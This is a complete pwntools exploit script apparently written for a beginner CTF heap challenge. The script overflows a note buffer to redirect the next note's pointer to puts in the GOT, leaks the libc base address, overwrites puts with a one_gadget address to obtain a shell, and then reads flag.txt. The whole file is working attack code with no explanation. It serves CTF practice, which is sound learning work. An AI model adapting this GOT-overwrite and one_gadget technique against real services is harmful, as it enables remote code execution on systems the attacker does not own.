#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '9003'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
libc = ELF('./libc-2.33.so')
context.binary = binfile

one_gadgets = [0xde78c, 0xde78f, 0xde792]

io = remote(HOST, PORT)

def create(content: bytes):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Content: ', content)


def edit(index: int, content: bytes) -> bytes:
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'index: ', str(index).encode())
    io.recvuntil(b'Old content: ')
    old = io.readline().strip()
    io.sendlineafter(b'New content: ', content)
    return old 


next_offset = 0x28

pad = b'a' * next_offset

create(b'hoge')
create(b'fuga')

# overwrite next->content by got['puts']
payload = pad + pack(e.got['puts'] - 8)
edit(0, payload)

# libc leak
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'index: ', b'2')
io.recvuntil(b'Old content: ')
libc_base = unpack(io.readline().ljust(8, b'\0')) - libc.sym['puts']

# overwrite got['puts'] by one_gadget
io.sendlineafter(b'New content: ', p64(libc_base + one_gadgets[1]))

io.sendline(b'echo exploited')

io.recvuntil(b'exploited')
io.sendline(b'cat flag.txt')
io.readline()
print(io.readline().decode(), end='')
